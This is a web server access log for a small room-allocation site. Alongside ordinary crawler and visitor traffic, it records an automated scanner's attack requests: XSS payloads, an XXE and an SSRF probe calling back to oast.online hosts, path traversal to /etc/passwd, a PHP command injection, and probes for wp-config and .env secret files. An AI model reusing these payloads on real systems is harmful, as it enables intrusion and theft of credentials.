194.163.182.89 - - [16/Jan/2023:00:50:01 +0000] "GET /wlsecurity.html HTTP/1.1" 404 955 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" "194.163.182.89" response-time=0.026
194.163.182.89 - - [16/Jan/2023:00:50:01 +0000] "GET /dokuwiki/doku.php?id=wiki:welcome&at=<svg%20onload=alert(document.domain)> HTTP/1.1" 404 1007 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36" "194.163.182.89" response-time=0.016
194.163.182.89 - - [16/Jan/2023:00:50:02 +0000] "GET /wp-json/wp/v2/posts?per_page=1 HTTP/1.1" 404 969 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" "194.163.182.89" response-time=0.047
194.163.182.89 - - [16/Jan/2023:00:50:04 +0000] "GET /wicket/resource/nl.planon.pssm.dashboard.cre.engine.wicket.page.AbstractDashboardPage/html/nodata.html?nodatamsg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1" 404 1053 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36" "194.163.182.89" response-time=0.009
194.163.182.89 - - [16/Jan/2023:00:50:04 +0000] "GET /xmlpserver/convert?xml=<%3fxml+version%3d\x221.0\x22+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+\x22http%3a//cf29h14ro9d2fenl8jpgcxnj6qyyyb511.oast.online/xxe.xml\x22>%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123 HTTP/1.1" 404 1126 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" "194.163.182.89" response-time=0.011
194.163.182.89 - - [16/Jan/2023:00:50:04 +0000] "GET /password.html HTTP/1.1" 404 953 "-" "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36" "194.163.182.89" response-time=0.063
194.163.182.89 - - [16/Jan/2023:00:50:05 +0000] "GET /find_v2/_click?_t_id=&_t_q=&_t_hit.id=&_t_redirect=https://interact.sh HTTP/1.1" 404 995 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36" "194.163.182.89" response-time=0.010
194.163.182.89 - - [16/Jan/2023:00:50:06 +0000] "GET /index.php?option=com_kif_nexus&controller=../../../../../../../../../etc/passwd HTTP/1.1" 404 991 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36" "194.163.182.89" response-time=0.031
194.163.182.89 - - [16/Jan/2023:00:50:06 +0000] "GET /plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd HTTP/1.1" 404 1010 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36" "194.163.182.89" response-time=0.035
194.163.182.89 - - [16/Jan/2023:00:50:06 +0000] "GET /fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27cat%20/etc/passwd%27)%2b%27 HTTP/1.1" 404 1014 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F" "194.163.182.89" response-time=0.058
194.163.182.89 - - [16/Jan/2023:00:50:12 +0000] "GET /getFavicon?host=http://cf29h14ro9d2fenl8jpgcxnj6oyyyb55h.oast.online HTTP/1.1" 404 995 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" "194.163.182.89" response-time=0.015
194.163.182.89 - - [16/Jan/2023:00:50:16 +0000] "POST /functionRouter HTTP/1.1" 404 957 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36" "194.163.182.89" response-time=0.012
194.163.182.89 - - [16/Jan/2023:00:51:27 +0000] "GET /AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini HTTP/1.1" 404 995 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36" "194.163.182.89" response-time=0.019
194.163.182.89 - - [16/Jan/2023:00:51:41 +0000] "GET /wp-content/plugins/movies/getid3/demos/demo.mimeonly.php?filename=filename%27%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E& HTTP/1.1" 404 1033 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36" "194.163.182.89" response-time=0.007
194.163.182.89 - - [16/Jan/2023:01:16:52 +0000] "POST /kindeditor/php/demo.php HTTP/1.1" 404 963 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36" "194.163.182.89" response-time=0.014
194.163.182.89 - - [16/Jan/2023:01:16:56 +0000] "POST /php/demo.php HTTP/1.1" 404 955 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" "194.163.182.89" response-time=0.009
194.163.182.89 - - [16/Jan/2023:01:42:29 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" "194.163.182.89" response-time=0.005
194.163.182.89 - - [16/Jan/2023:01:42:33 +0000] "GET /public/config.js HTTP/1.1" 404 957 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36" "194.163.182.89" response-time=0.026
194.163.182.89 - - [16/Jan/2023:01:42:37 +0000] "GET /config.js HTTP/1.1" 404 951 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36" "194.163.182.89" response-time=0.007
194.163.182.89 - - [16/Jan/2023:01:42:38 +0000] "POST /api/login HTTP/1.1" 404 953 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36" "194.163.182.89" response-time=0.007
194.163.182.89 - - [16/Jan/2023:01:42:42 +0000] "POST /api/login HTTP/1.1" 404 953 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F" "194.163.182.89" response-time=0.034
194.163.182.89 - - [16/Jan/2023:01:42:46 +0000] "POST /api/login HTTP/1.1" 404 953 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36" "194.163.182.89" response-time=0.007
207.46.13.39 - - [16/Jan/2023:03:15:53 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" "207.46.13.39" response-time=0.002
207.46.13.222 - - [16/Jan/2023:07:14:21 +0000] "GET /robots.txt HTTP/1.1" 404 951 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" "207.46.13.222" response-time=0.150
207.46.13.75 - - [16/Jan/2023:07:19:38 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "207.46.13.75" response-time=0.016
194.163.182.89 - - [16/Jan/2023:08:18:32 +0000] "GET /wp-config.php HTTP/1.1" 404 954 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" "194.163.182.89" response-time=0.073
194.163.182.89 - - [16/Jan/2023:08:18:34 +0000] "GET /.wp-config.php.swp HTTP/1.1" 404 959 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36" "194.163.182.89" response-time=0.012
194.163.182.89 - - [16/Jan/2023:08:18:37 +0000] "GET /wp-config-sample.php HTTP/1.1" 404 959 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" "194.163.182.89" response-time=0.013
194.163.182.89 - - [16/Jan/2023:08:18:39 +0000] "GET /wp-config.inc HTTP/1.1" 404 954 "-" "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36" "194.163.182.89" response-time=0.013
194.163.182.89 - - [16/Jan/2023:08:18:41 +0000] "GET /wp-config.old HTTP/1.1" 404 954 "-" "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36" "194.163.182.89" response-time=0.015
194.163.182.89 - - [16/Jan/2023:08:18:43 +0000] "GET /wp-config.txt HTTP/1.1" 404 954 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36" "194.163.182.89" response-time=0.009
194.163.182.89 - - [16/Jan/2023:08:18:45 +0000] "GET /wp-config.php.txt HTTP/1.1" 404 958 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" "194.163.182.89" response-time=0.008
194.163.182.89 - - [16/Jan/2023:08:18:48 +0000] "GET /wp-config.php.bak HTTP/1.1" 404 958 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36" "194.163.182.89" response-time=0.009
194.163.182.89 - - [16/Jan/2023:08:18:50 +0000] "GET /wp-config.php.old HTTP/1.1" 404 958 "-" "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36" "194.163.182.89" response-time=0.014
194.163.182.89 - - [16/Jan/2023:08:18:52 +0000] "GET /wp-config.php.dist HTTP/1.1" 404 958 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36" "194.163.182.89" response-time=0.012
194.163.182.89 - - [16/Jan/2023:08:18:54 +0000] "GET /wp-config.php.inc HTTP/1.1" 404 958 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" "194.163.182.89" response-time=0.012
194.163.182.89 - - [16/Jan/2023:08:18:56 +0000] "GET /wp-config.php.swp HTTP/1.1" 404 958 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36" "194.163.182.89" response-time=0.008
194.163.182.89 - - [16/Jan/2023:08:18:58 +0000] "GET /wp-config.php.html HTTP/1.1" 404 957 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36" "194.163.182.89" response-time=0.009
194.163.182.89 - - [16/Jan/2023:08:19:00 +0000] "GET /wp-config-backup.txt HTTP/1.1" 404 959 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36" "194.163.182.89" response-time=0.009
194.163.182.89 - - [16/Jan/2023:08:19:02 +0000] "GET /wp-config.php.save HTTP/1.1" 404 957 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36" "194.163.182.89" response-time=0.010
194.163.182.89 - - [16/Jan/2023:08:19:04 +0000] "GET /wp-config.php~ HTTP/1.1" 404 957 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" "194.163.182.89" response-time=0.011
194.163.182.89 - - [16/Jan/2023:08:19:06 +0000] "GET /wp-config.php-backup HTTP/1.1" 404 959 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36" "194.163.182.89" response-time=0.007
194.163.182.89 - - [16/Jan/2023:08:19:08 +0000] "GET /wp-config.php.orig HTTP/1.1" 404 958 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36" "194.163.182.89" response-time=0.006
194.163.182.89 - - [16/Jan/2023:08:19:11 +0000] "GET /wp-config.php_orig HTTP/1.1" 404 959 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" "194.163.182.89" response-time=0.008
194.163.182.89 - - [16/Jan/2023:08:19:13 +0000] "GET /wp-config.php.original HTTP/1.1" 404 961 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36" "194.163.182.89" response-time=0.009
194.163.182.89 - - [16/Jan/2023:08:19:15 +0000] "GET /_wpeprivate/config.json HTTP/1.1" 404 963 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36" "194.163.182.89" response-time=0.010
194.163.182.89 - - [16/Jan/2023:08:29:13 +0000] "GET /.env HTTP/1.1" 404 947 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36" "194.163.182.89" response-time=0.015
194.163.182.89 - - [16/Jan/2023:08:29:16 +0000] "GET /.env.bak HTTP/1.1" 404 952 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" "194.163.182.89" response-time=0.011
194.163.182.89 - - [16/Jan/2023:08:29:18 +0000] "GET /.env.dev HTTP/1.1" 404 951 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36" "194.163.182.89" response-time=0.005
194.163.182.89 - - [16/Jan/2023:08:29:20 +0000] "GET /.env.dev.local HTTP/1.1" 404 956 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36" "194.163.182.89" response-time=0.006
194.163.182.89 - - [16/Jan/2023:08:29:23 +0000] "GET /.env.development.local HTTP/1.1" 404 961 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" "194.163.182.89" response-time=0.006
194.163.182.89 - - [16/Jan/2023:08:29:25 +0000] "GET /.env.prod HTTP/1.1" 404 952 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36" "194.163.182.89" response-time=0.005
194.163.182.89 - - [16/Jan/2023:08:29:27 +0000] "GET /.env.prod.local HTTP/1.1" 404 957 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36" "194.163.182.89" response-time=0.007
194.163.182.89 - - [16/Jan/2023:08:29:29 +0000] "GET /.env.production HTTP/1.1" 404 956 "-" "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" "194.163.182.89" response-time=0.006
194.163.182.89 - - [16/Jan/2023:08:29:31 +0000] "GET /.env.production.local HTTP/1.1" 404 960 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36" "194.163.182.89" response-time=0.007
194.163.182.89 - - [16/Jan/2023:08:29:34 +0000] "GET /.env.local HTTP/1.1" 404 953 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36" "194.163.182.89" response-time=0.009
194.163.182.89 - - [16/Jan/2023:08:29:36 +0000] "GET /.env.example HTTP/1.1" 404 954 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36" "194.163.182.89" response-time=0.008
194.163.182.89 - - [16/Jan/2023:08:29:38 +0000] "GET /.env.stage HTTP/1.1" 404 951 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36" "194.163.182.89" response-time=0.007
194.163.182.89 - - [16/Jan/2023:08:29:40 +0000] "GET /.env.live HTTP/1.1" 404 951 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36" "194.163.182.89" response-time=0.007
194.163.182.89 - - [16/Jan/2023:08:29:42 +0000] "GET /.env.backup HTTP/1.1" 404 953 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36" "194.163.182.89" response-time=0.006
194.163.182.89 - - [16/Jan/2023:08:29:45 +0000] "GET /.env.save HTTP/1.1" 404 951 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36" "194.163.182.89" response-time=0.011
194.163.182.89 - - [16/Jan/2023:08:29:47 +0000] "GET /.env.old HTTP/1.1" 404 951 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" "194.163.182.89" response-time=0.006
194.163.182.89 - - [16/Jan/2023:08:29:49 +0000] "GET /.env.www HTTP/1.1" 404 952 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" "194.163.182.89" response-time=0.008
194.163.182.89 - - [16/Jan/2023:08:29:51 +0000] "GET /.env_1 HTTP/1.1" 404 951 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36" "194.163.182.89" response-time=0.006
194.163.182.89 - - [16/Jan/2023:08:29:53 +0000] "GET /.env_sample HTTP/1.1" 404 954 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" "194.163.182.89" response-time=0.009
194.163.182.89 - - [16/Jan/2023:08:29:55 +0000] "GET /.env.breakoutroom HTTP/1.1" 404 953 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36" "194.163.182.89" response-time=0.010
194.163.182.89 - - [16/Jan/2023:08:29:57 +0000] "GET /.env. HTTP/1.1" 404 948 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36" "194.163.182.89" response-time=0.007
194.163.182.89 - - [16/Jan/2023:08:30:00 +0000] "GET /api/.env HTTP/1.1" 404 951 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36" "194.163.182.89" response-time=0.010
207.46.13.39 - - [16/Jan/2023:13:02:59 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "207.46.13.39" response-time=6.248
51.222.253.1 - - [16/Jan/2023:14:08:53 +0000] "GET /robots.txt HTTP/1.1" 404 950 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" "51.222.253.1" response-time=0.083
51.222.253.13 - - [16/Jan/2023:14:08:55 +0000] "GET /allocate/9over3 HTTP/1.1" 200 1920 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" "51.222.253.13" response-time=0.469
91.84.212.58 - - [16/Jan/2023:16:24:49 +0000] "GET /favicon.ico HTTP/1.1" 404 951 "http://breakoutroom.pythonanywhere.com/allocate/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.49" "91.84.212.58" response-time=0.103
162.55.85.225 - - [16/Jan/2023:19:27:08 +0000] "GET /robots.txt HTTP/1.1" 404 950 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" "162.55.85.225" response-time=0.081
162.55.85.225 - - [16/Jan/2023:19:27:11 +0000] "GET /sitemap HTTP/1.1" 404 950 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" "162.55.85.225" response-time=0.008
162.55.85.225 - - [16/Jan/2023:19:27:14 +0000] "GET /sitemap.txt HTTP/1.1" 404 953 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" "162.55.85.225" response-time=0.006
162.55.85.225 - - [16/Jan/2023:19:27:18 +0000] "GET /allocate/9over3 HTTP/1.1" 200 1920 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" "162.55.85.225" response-time=0.173
40.77.167.52 - - [16/Jan/2023:20:35:02 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" "40.77.167.52" response-time=0.005
194.163.182.89 - - [16/Jan/2023:22:48:09 +0000] "GET /index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../tmp/ HTTP/1.1" 404 1025 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" "194.163.182.89" response-time=0.061
194.163.182.89 - - [16/Jan/2023:22:48:39 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36" "194.163.182.89" response-time=0.002
65.21.232.254 - - [17/Jan/2023:00:24:37 +0000] "GET /robots.txt HTTP/1.1" 404 2199 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" "65.21.232.254" response-time=0.023
65.21.232.254 - - [17/Jan/2023:00:24:38 +0000] "GET /allocate/ HTTP/1.1" 200 2495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" "65.21.232.254" response-time=0.024
216.244.66.201 - - [17/Jan/2023:01:01:26 +0000] "GET /robots.txt HTTP/1.1" 404 2199 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" "216.244.66.201" response-time=0.022
216.244.66.201 - - [17/Jan/2023:01:39:54 +0000] "GET /allocate/9over3 HTTP/1.1" 200 6884 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" "216.244.66.201" response-time=0.209
207.46.13.39 - - [17/Jan/2023:02:01:45 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "207.46.13.39" response-time=0.004
104.47.55.254 - - [17/Jan/2023:05:41:05 +0000] "HEAD /allocate/ HTTP/1.1" 200 0 "-" "-" "104.47.55.254" response-time=0.055
65.60.128.74 - - [17/Jan/2023:05:41:05 +0000] "GET /allocate/ HTTP/1.1" 200 2495 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" "65.60.128.74" response-time=0.009
65.60.128.74 - - [17/Jan/2023:05:41:05 +0000] "GET /favicon.ico HTTP/1.1" 404 952 "https://breakoutroom.pythonanywhere.com/allocate/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" "65.60.128.74" response-time=0.051
172.176.117.104 - - [17/Jan/2023:05:41:22 +0000] "GET /allocate/ HTTP/1.1" 200 2495 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36" "172.176.117.104" response-time=0.004
172.176.117.104 - - [17/Jan/2023:05:41:27 +0000] "GET /favicon.ico HTTP/1.1" 404 952 "https://breakoutroom.pythonanywhere.com/allocate/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36" "172.176.117.104" response-time=0.013
65.60.128.74 - - [17/Jan/2023:05:41:48 +0000] "GET /allocate/35over5 HTTP/1.1" 200 2566 "https://breakoutroom.pythonanywhere.com/allocate/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" "65.60.128.74" response-time=0.212
65.60.128.74 - - [17/Jan/2023:05:41:56 +0000] "GET /allocate/35over4 HTTP/1.1" 200 2566 "https://breakoutroom.pythonanywhere.com/allocate/35over5" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" "65.60.128.74" response-time=0.095
40.77.167.52 - - [17/Jan/2023:05:56:56 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "40.77.167.52" response-time=0.003
86.48.2.81 - - [17/Jan/2023:06:10:20 +0000] "GET /allocate/database.php.bak HTTP/1.1" 404 1121 "-" "Mozilla/5.0 (Linux; Android 10; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36" "86.48.2.81" response-time=0.026
86.48.2.81 - - [17/Jan/2023:06:10:20 +0000] "GET /allocate/database.php_bak HTTP/1.1" 404 1121 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.105 Safari/537.36 Vivaldi/1.0.162.9" "86.48.2.81" response-time=0.061
86.48.2.81 - - [17/Jan/2023:06:10:20 +0000] "GET /allocate/database.php.orig HTTP/1.1" 404 1122 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML like Gecko) Maxthon/4.0.0.2000 Chrome/22.0.1229.79 Safari/537.1" "86.48.2.81" response-time=0.072
86.48.2.81 - - [17/Jan/2023:06:10:20 +0000] "GET /allocate/config.php.bak HTTP/1.1" 404 1119 "-" "Mozilla/5.0 (X11; NetBSD amd64; rv:30.0) Gecko/20100101 Firefox/30.0" "86.48.2.81" response-time=0.466
86.48.2.81 - - [17/Jan/2023:06:10:20 +0000] "GET /allocate/config.php.orig HTTP/1.1" 404 1119 "-" "Mozilla/5.0 (Macintosh; U; Mac OS X Mach-O; en-US; rv:2.0a) Gecko/20040614 Firefox/3.0.0" "86.48.2.81" response-time=0.437
207.46.13.222 - - [17/Jan/2023:11:50:41 +0000] "GET /robots.txt HTTP/1.1" 404 950 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "207.46.13.222" response-time=0.285
